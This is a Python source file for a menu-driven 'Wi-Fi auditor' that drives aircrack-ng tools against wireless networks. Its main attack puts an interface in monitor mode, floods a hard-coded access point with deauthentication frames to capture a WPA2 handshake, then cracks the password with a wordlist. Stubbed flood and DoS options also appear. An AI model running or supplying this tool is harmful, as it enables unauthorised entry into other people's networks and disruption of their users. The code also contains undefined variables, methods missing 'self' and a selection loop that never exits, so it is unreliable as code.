#!/usr/bin/python3
# WIFI AUDITOR TOOL FUNCTION FILE
import os
import re
import subprocess
import sys
import time


class Auditor:
	# Options list for the Auditor class
	options = {
	"ap_channel"          : "157",
	"ap_bssid"            : "36:cf:f6:f2:fb:34",
	"ap_ssid"             : "",
	"eapol_file_path"     : "",
	"eapol_file_name"     : "",
	"eapol_save_path"     : "",
	"dict_file"           : "/usr/share/wordlists/john.lst"
	}

	def __init__(self, iface, iface_mode):
		self.iface = iface
		self.iface_mode = iface_mode

	def interface_check(self):
		'''
		Check if there is Wi-Fi capable interfaces
		if there is return a list of there name and 
		operating mode
		'''
		# Runs the subprocess command to get the output from iwconfig in string format
		# Try to run the following command and handle any errors
		try:
			ifaces = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
		except Exception as e:
			print("Something went wrong!\nExiting...")
			print(e.stderr)
			sys.exit()

		# Checks if there is a wifi interface available, if not it will exit
		if ifaces.stdout == "":
			print("!!! CONNECT WIRELESS INTERFACE AND RE-RUN PROGRAM !!!")
			sys.exit()

		# If there a usable interface, get the interface name
		# and the current mode it's operating in.
		wlan_iface_info = re.findall(r'(wlan\d+).*?Mode:([^ ]+)', ifaces.stdout, re.DOTALL)

		return wifi_iface_info    

	def set_interface(self, iface_info):
		'''
		Based on the value passed in by interface_check, 
		help the user set the Wireless Interface they want to 
		use with this tool. 
		'''
		# Checks how many values were passed in
		if len(iface_info) > 1:
			while True:
				print("------------ Mᴜʟᴛɪᴘʟᴇ Iɴᴛᴇʀғᴀᴄᴇs Dᴇᴛᴇᴄᴛᴇᴅ ------------\n")

				# Print out all of the interfaces and their modes 
				counter = 0
				for iface in iface_info:
					wifi_interface = iface[0]
					mode_value = iface[1]
					print(f"{counter}. Wi-Fi Interface: {wifi_interface}, Mode: {mode_value}\n")
					# Increase counter to have a numbered list
					counter += 1

				print("------------------------------------------------------\n")

				# Prompt the user to choose the interface they'd like to use
				print("------------ Cʜᴏᴏsᴇ Dᴇsɪʀᴇᴅ Iɴᴛᴇʀғᴀᴄᴇ (Nᴜᴍʙᴇʀs Oɴʟʏ) ------------\n")
				choice = int(input("--> "))

				# Set the interface values in the class
				if choice > len(iface_info):
					print("Invalid Choice, retry!")
					continue

				else:
					self.iface = iface_info[0][0]
					self.iface_mode = iface_info[0][1]

	def start_mon_mode(self):
		'''
		For the majority of the auditing tasks, the device 
		should be in monitor mode. This method will change the 
		operating mode of the device. 
		'''
		# First check if the device is already in monitor mode
		mon_active = True if self.iface_mode == "Monitor" else False

		# If the device isn't in monitor mode do the following.
		if not mon_active:

			# Check if the device supports monitor mode.
			dev_supports_mon = self.supports_mon()

			# If it does change it to monitor mode otherwise print the message
			# and exit.
			if dev_supports_mon: 
				print(f"Changing Mode from --> {self.iface_mode} Mode\nChanging Mode To   --> Monitor Mode")

				# Try to run the following command and handle any errors
				try:
					activate_mon_mode = subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
				except Exception as e:
					# Catch any exception that the following command throws.
					# Print the exception and exit.
					print("Something went wrong!")
					print(e.stderr)
					sys.exit()

				# Try to run the following command and handle any errors
				try:
					activate_mon_mode = subprocess.run(['airmon-ng', 'start', f'{self.iface}'], capture_output=True, text=True, check=True)
				except Exception as e:
					# Catch any exception that the following command throws.
					# Print the exception and exit.
					print("Something went wrong!\n")
					print(e.stderr)
					sys.exit()
				else:
					print(activate_mon_mode.stdout)

			else:
				print("Device Doesn't Support Monitor Mode...\n Exiting")
				sys.exit()

	def wifi_area_scan(self):
		'''
		Scan for Wi-Fi Networks in the Surrounding Area
		'''
		# Clear the terminal output
		self.clear_term()

		# Run the airodump command with subprocess and catch any errors.
		try:
			subprocess.run(['airodump-ng', f'{self.iface}'], check=True)
		except subprocess.CalledProcessError as e:
			print("An Error was raised!\nExiting...")
			sys.exit()

		# Catch the error caused by the user exiting the program
		except KeyboardInterrupt:
			self.keep_running()

	def wpa2_cracking_attack(self):
		'''
		Perform a WPA2 Cracking Attack.
		'''
		# Define the required options to be set for this attack
		req_opts = {
		"ap_channel"      : 1,
		"ap_bssid"        : 1,
		"ap_ssid"         : 0,
		"eapol_file_path" : 0,
		"eapol_file_name" : 1,
		"eapol_save_path" : 1,
		"dict_file"       : 1,
		}

		# Show the current required options and prompt them to
		# settings change the required
		self.choose_option(req_opts)

		# Before running the attack make sure the option requirements are set
		if not self.requirements_satisfied(req_opts):
			self.choose_option(req_opts)
			
		else:
			# Print the attacking messages
			self.clear_term()
			print("-----ATTEMPTING TO CAPTURE WPA HANDSHAKE-----")
			print(f"\nInterface     --> {self.iface}")
			print(f"Interface Mode --> {self.iface_mode}")
			print(f"AP BSSID        --> {self.options['ap_bssid']}")
			print(f"AP Channel      --> {self.options['ap_channel']}")
			print(f"\n---------------------------------------------")

			# Create the listener for capturing EAPOL packets
			listener_proc = self.create_listener()

			# Create the deauther for deauthing the specifed AP to catch the EAPOL packets
			deauth_proc = self.create_deauther()

			# Terminate the deauther process and wait a couple seconds
			deauth_proc.terminate()
			time.sleep(2)

			# Timer for 30 seconds to see if the attack failed
			start = time.time()
			max_duration = 30 


			# Monitor the standard output of the listener for the "EAPOL" message
			for line in iter(listener_proc.stdout.readline, b''):

				# Detect the EAPOL packets and terminate the listener
				if "WPA handshake" in line:
					time.sleep(2)
					listener_proc.terminate()
					break

				# Check if the attack has been running for too long
				if time.time() - start >= max_duration:
					listener_proc.terminate()
					deauth_proc.terminate()
					print("********* Attack Failed **********")
					print("**** Too Much Time Has Passed ****")
					time.sleep(2)
					self.select_attack()
					break



			# Crack the password from the captured EAPOL packets
			self.create_cracker()

	def auth_flood():
		'''
		Perform a Wi-Fi Authentication Flood
		'''
		self.clear_term()
		print("Flooding...")

	def deauth_attack():
		'''
		Perform a Wi-Fi De-Authentication Attack
		'''
		self.clear_term()
		print("Deauthing...")


	def beacon_flood():
		'''
		Perform a Wi-Fi Beacon Flood Attack
		'''
		self.clear_term()
		print("Beacon Flooding...")

	def layer_1_dos():
		'''
		Peform a Layer 1 Denial of Service Attack.
		'''
		self.clear_term()
		print("Spamming...")

	def select_attack(self):
		'''
		Print out a list of options for the users to choose from
		'''
		while True:
			self.banner_print()
			print(f"Selected Interface --> {self.iface}")
			print(f"Current Interface Mode --> {self.iface_mode}")
			print("----------------------------------------------------------------------------------")
			print("""
............................... Aᴜᴅɪᴛ Tᴏᴏʟ Lɪsᴛ ...................................

1. Sʜᴏᴡ Wɪ-Fɪ Nᴇᴛᴡᴏʀᴋs ɪɴ ᴛʜᴇ Sᴜʀʀᴏᴜɴᴅɪɴɢ Aʀᴇᴀ
2. Pᴇʀғᴏʀᴍ ᴀ WPA2 Cʀᴀᴄᴋɪɴɢ Aᴛᴛᴀᴄᴋ
3. Aᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ Fʟᴏᴏᴅ (Lᴀʏᴇʀ 2 DᴏS)
4. Dᴇᴀᴜᴛʜ Aᴛᴛᴀᴄᴋ (Lᴀʏᴇʀ 2 DᴏS)
5. Bᴇᴀᴄᴏɴ Fʟᴏᴏᴅ (Lᴀʏᴇʀ 2 DᴏS)
6. Lᴀʏᴇʀ 1 DᴏS
7. Exɪᴛ ᴛʜᴇ Pʀᴏɢʀᴀᴍ
..................................................................................
			""")

			try:
				choice = int(input("-------------------------- Cʜᴏᴏsᴇ ᴀ Tᴏᴏʟ (Nᴜᴍʙᴇʀs Oɴʟʏ) -------------------------- \n--> "))

				if choice == 1 and choice < 8:
					self.wifi_area_scan()
					break
				elif choice == 2 and choice < 8:
					self.wpa2_cracking_attack()
					break
				elif choice == 3 and choice < 8:
					self.auth_flood()
					break
				elif choice == 4 and choice < 8:
					self.deauth_attack()
					break
				elif choice == 5 and choice < 8:
					self.beacon_flood()
					break
				elif choice == 6 and choice < 8:
					self.layer_1_dos()
					break
				elif choice == 7 and choice < 8:
					sys.exit()
				else:
					self.clear_term()
					print("Number Out of Range, Retry the Option...")
					time.sleep(3)
					continue
			except Exception as e:
				print("Invalid Option, Retry the Option...")
				print(e)
				time.sleep(3)
				continue

	def supports_mon(self):
		'''
		Helper function to check if the device supports monitor mode.
		'''
		# Try to run the following command and handle any errors
		try:
			mon_allowed = subprocess.run(['iw', 'list'], capture_output=True, text=True, check=True)
		except Exception as e:
			print("Something went wrong!\nExiting...")
			print(e.stderr)
			sys.exit()
		
		# Return true '* monitor' otherwise return false
		if '* monitor' in mon_allowed.stdout:
			return True
		else:
			return False

	def clear_term(self):
		'''
		Helper function to clear the terminal output.
		'''
		subprocess.run(["clear"])

	def keep_running(self):
		'''
		After an option has been ran and exited
		ask the user if they want to keep the 
		tool running
		'''
		# Prompt the user to contiue if they'd like.
		while True:
			print("\n--------- Continue Using Wi-Fi Auditor Tool (Y|n) ---------")
			keep_auditing = input("--> ")

			# Handle the possible inputs
			if not keep_auditing.strip():
				print("\n\n")
				self.select_attack()
				break

			elif keep_auditing.lower() == 'y':
				print("\n\n")
				self.select_attack()
				break

			elif keep_auditing.lower() == 'n':
				print("\n!! Have a good day !!")
				sys.exit()

			else:
				print(f"\n!!Invalid Option '{keep_auditing}'!!")
				continue


	def create_listener(self):
		'''
		Run a command to start for the listener (catches EAPOL packets)
		'''
		# List for all of the options of the airodump command.
		if self.options['eapol_file_name'] and not self.options['eapol_file_path']:
			eapol_input = os.path.join(os.getcwd(), self.options['eapol_file_name'])
			listener_cmd = [
			"airodump-ng",
			"-c", f"{self.options['ap_channel']}",
			"-d", f"{self.options['ap_bssid']}",
			"-w", f"{eapol_input}",
			f"{self.iface}"
			]


		if self.options['eapol_file_name'] and self.options['eapol_file_path']:
			save_path = self.options['eapol_file_path']
			if save_path[-1] != '/':
				save_path += '/'
				eapol_input = os.path.join(save_path, self.options['eapol_file_name'])
				listener_cmd = [
				"airodump-ng",
				"-c", f"{self.options['ap_channel']}",
				"-d", f"{self.options['ap_bssid']}",
				"-w", f"{eapol_input}",
				f"{self.iface}"
				]
			else:
				eapol_input = os.path.join(self.options['eapol_file_path'], self.options['eapol_file_name'])
				listener_cmd = [
				"airodump-ng",
				"-c", f"{self.options['ap_channel']}",
				"-d", f"{self.options['ap_bssid']}",
				"-w", f"{eapol_input}",
				f"{self.iface}"
				]


		try:
			# Run the listener command
			listener_proc  = subprocess.Popen(listener_cmd, stdout=subprocess.PIPE, text=True, bufsize=1)

		# If subprocess gives this error exit
		except Exception as e:
			print(e)
			print("Something went wrong!!")
			sys.exit()

		return listener_proc

	def create_cracker(self):
		'''
		Run a command to crack EAPOL packets for a Wi-Fi password
		'''
		# List of all of the options for the aircrack command.
		crack_pass_cmd = [
		"aircrack-ng",
		"-w", f"{self.options['dict_file']}",
		"-b", f"{self.options['ap_bssid']}",
		f"{self.options['eapol_save_path']}",
		]

		try:
			# Run the Deauthentication command
			subprocess.run(crack_pass_cmd, check=True)

		# If subprocess gives this error exit
		except subprocess.CalledProcessError:
			print("Something went wrong!!")
			sys.exit()
		finally: 
			while True:
				# See if the user is done
				print("*" * 26 + " Attack Completed " + "*" * 26 + "\n")
				print("Would you like to do another attack | (Y|n)")
				back_to_attacks = input("\n--> ")
				
				if back_to_attacks.lower() == 'y':
					self.select_attack()
					break
				elif back_to_attacks.lower() == 'n':
					print("\n" * 3)
					print("-" * 69)
					print("\n**** Have a Good Day! :) ****")
					sys.exit()
				else:
					print("\n" * 3)
					print("**** Retry Answer ****")
					continue


	def create_deauther(self):
		'''
		Run a command to deauthenticate the users
		from the specified BSSID
		'''
		# List for all of the options of the aireplay command.
		deauth_cmd = [
		"aireplay-ng",
		"-0", "0",
		"-a", f"{self.options['ap_bssid']}",
		f"{self.iface}"
		]

		try:
			# Run the Deauthentication command
			time.sleep(1)
			deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, text=True, bufsize=1)
			time.sleep(2)

		# If subprocess gives this error exit
		except Exception as e:
			print("Something went wrong!!")
			sys.exit()

		return deauth_proc

	def show_options(self, req_opts):
		'''
		Display the values in the options dictionary
		'''
		print("......... CURRENT OPTIONS ...........")
		# Loop through the currently set options

		counter = 0
		for option in self.options.items():
			counter += 1

			# Don't print this line on the first option
			print("-" * 36)
			print(f"Option Name          --> {option[0]}")

			# If there's no value it will say un_set, otherwise give the option value
			if not option[1]:
				print("Option Value         --> not_set")
			else:
				print(f"Option Value         --> {option[1]}")

			# Tell the user if the option is required or not
			print(f"Required for Command --> ", end="")
			print("yes") if req_opts[option[0]] == 1 else print("no")
			print("-" * 36)

	def choose_option(self, req_opts):
		'''
		Prompt the user to change an option.
		'''
		usage_statement = """
____________COMMANDS____________
1. set
2. run
3. quit
--------------------------------

_____________SYNTAX_____________
--> set option_name option_value
--> run
--> quit
--------------------------------

**** ALL COMMANDS ARE CASE INSENSITIVE ****
		"""


		while True:
			#  Clear the terminal on each loop
			self.clear_term()

			# Print out the list of currently set options
			self.show_options(req_opts)

			# Print the usage statement to tell the user how to run commands
			print(usage_statement)


			# Display the list of options to set
			print("Set an option | Run the attack | Quit the program")
			option_choice = input("--> ")

			# Clean the user input
			sanitized_input = self.option_cmd_parser(option_choice)

			# If the santized input was correct
			if isinstance(sanitized_input, list):

				# Check if the option chosen is valid
				if sanitized_input[0] in self.options:
					# Set the valid option
					print(f"\nSetting --- {sanitized_input[0]} --- to --- {sanitized_input[1]}")
					self.options[sanitized_input[0]] = sanitized_input[1]
					continue
				else:
					continue
					print("Invalid Option")

			# Check if the user wants to run the command
			elif sanitized_input == 'run':
				break
			elif sanitized_input == 'quit':
				# If this command is passed exit the script
				print("\nHave a good day!!")
				sys.exit()
				break



	def option_cmd_parser(self, user_input):
		'''
		Takes in the users input and ensures its valid
		for setting the desired option.
		'''

		# Split the user_input string into a list
		option_cmds = user_input.split()

		# Check if the user_input contained the word 'set'
		if 'set' in option_cmds[0].lower() and len(option_cmds) == 3:

			# Do a case insensitive search to find if the command is formatted properly
			if option_cmds[0].lower() == 'set' and option_cmds[1].lower() in self.options.keys():
				# Pass everything into set_parser
				result = self.set_cmd_parser(option_cmds)
				if result:
					return result

			# Otherwise return improper option_name or command name
			else:
				self.clear_term()
				print(f'**** Bad Command Format ****\nFailed Command --> {user_input}\n**** Retry Command ****')
				time.sleep(4)
				return False

		elif 'run' in option_cmds[0].lower() and len(option_cmds) == 1:
			return 'run'

		elif 'quit' in option_cmds[0].lower() and len(option_cmds) == 1:
			return 'quit'

		else:
			# Clear the terminal and print the error message
			self.clear_term()
			print("**** BAD COMMAND PASSED ****")
			time.sleep(3)
			return None

	def requirements_satisfied(self, req_opts):
		'''
		Before it runs the command it will check if all the 
		requirements are set
		'''
		for option in self.options.items():
			# Check the option requirements to see if the value is given
			if req_opts[option[0]] == 1 and not option[1]:
				self.clear_term()
				print(f"Option Value for {option[0]} Option Needs to be set\nSet it then run the attack")
				time.sleep(3)
				return False
		return True

		# If the options are all set properly proceed
		return True

	def unique_eapol_name(self, base_filename, save_dir):
		'''
		Ensure that the eapol_file_name passed in is unique.
		return the valid_eapol_path to to eventually crack
		the eapol packets.
		'''
		if not os.path.exists(save_dir):
			# Notify the user of the bad file path and return False
			print("**** Bad File Path ****")
			time.sleep(2)
			# Bring up the options again
			self.choose_option()

		# User might not add the trailing /
		if save_dir[-1] != '/':
			save_dir = save_dir + '/'

		# Eapol packets get with a suffix, try the file_path specified to
		# make sure the save location is valid.
		suffix = 1
		while True:
			potential_filename = os.path.join(save_dir, f"{base_filename}-{suffix:02d}.cap")
			if not os.path.exists(potential_filename):
				# If the file path is valid set the eapol_save_path
				self.options['eapol_save_path'] = potential_filename
				break

			suffix += 1

	def bssid_handler(self, bssid_addr):
		'''
		Makes sure the MAC address is valid first,
		if it is, make sure it is in the standard format
		with colons as seperators
		'''
		# Convert bssid_addr to lowercase
		bssid_addr = bssid_addr.lower()

		# Pattern to validate the BSSID's being passed in
		bssid_pattern = re.compile(r'^([0-9a-f]{2}[:-]?){5}([0-9a-f]{2})$')

		# Check if the BSSID is valid
		valid_bssid = bssid_pattern.match(bssid_addr)
		if valid_bssid:
			# Normalize BSSID format by replacing hypens and dots with colons
			normalized_bssid = re.sub(r'[^a-f0-9]', ':', bssid_addr)
			return normalized_bssid
		else:
			return False

	def set_cmd_parser(self, opt_lst):
		'''
		Checks for all of the possible options 
		that can be set with the set command.
		'''
		# Check if it was eapol_file_name trying to be set and eapol_file_path not set.
		if opt_lst[1].lower() == 'eapol_file_name' and not self.options['eapol_file_path']:
			# Set the eapol_save_path to make it possible to crack the Wi-Fi password
			self.unique_eapol_name(opt_lst[2], os.getcwd())
			return [opt_lst[1].lower(), opt_lst[2]]

		if opt_lst[1].lower() == 'eapol_file_name' and self.options['eapol_file_path']:
			self.unique_eapol_name(opt_lst[2], self.options['eapol_file_path'])
			return [opt_lst[1].lower(), opt_lst[2]]

		# Check if the eapol_file_path was passed in and eapol_file_name is set
		if opt_lst[1].lower() == 'eapol_file_path' and self.options['eapol_file_name']:
			# Set the eapols_save_path to make it possible to crack the Wi-Fi password
			self.unique_eapol_name(self.options['eapol_file_name'], opt_lst[2])
			return [opt_lst[1].lower(), opt_lst[2]]

		if opt_lst[1].lower() == 'eapol_file_path':
			if os.path.exists(opt_lst[2]):
				return [opt_lst[1].lower(), opt_lst[2]]
			else:
				self.clear_term()
				print("**** Bad File Path ****")
				time.sleep(2)

		# Check that the BSSID is valid and if it is return it in the proper format
		if opt_lst[1].lower() == 'ap_bssid':
			standard_bssid = self.bssid_handler(opt_lst[2])
			if standard_bssid:
				return [opt_lst[1].lower(), standard_bssid]
			else:
				self.clear_term()
				print("**** Invalid BSSID ****")
				time.sleep(2)

		# Check that the dictonary file exists
		if option_lst[1].lower() == 'dict_file':
			if os.path.exists(opt_lst[2]):
				return [opt_lst[1].lower(), opt_lst[2]]
			else:
				self.clear_term()
				print("**** Invalid Dictionary File ****")
				time.sleep(2)


	def banner_print(self):
		'''
		Prints the WIFI Auditor tool banner
		'''
		print("""
     __     __     __     ______   __                                     
    /\ \  _ \ \   /\ \   /\  ___\ /\ \                                    
    \ \ \/ ".\ \  \ \ \  \ \  __\ \ \ \                                   
     \ \__/".~\_\  \ \_\  \ \_\    \ \_\                                  
      \/_/   \/_/   \/_/   \/_/     \/_/                                  
                                                                      
     ______     __  __     _____     __     ______   ______     ______    
    /\  __ \   /\ \/\ \   /\  __-.  /\ \   /\__  _\ /\  __ \   /\  == \   
    \ \  __ \  \ \ \_\ \  \ \ \/\ \ \ \ \  \/_/\ \/ \ \ \/\ \  \ \  __<   
     \ \_\ \_\  \ \_____\  \ \____-  \ \_\    \ \_\  \ \_____\  \ \_\ \_\ 
      \/_/\/_/   \/_____/   \/____/   \/_/     \/_/   \/_____/   \/_/ /_/  
		""")
		print("----------------------------------------------------------------------------------")


wlan0instance = Auditor('wlan0', 'Monitor')
wlan0instance.select_attack()


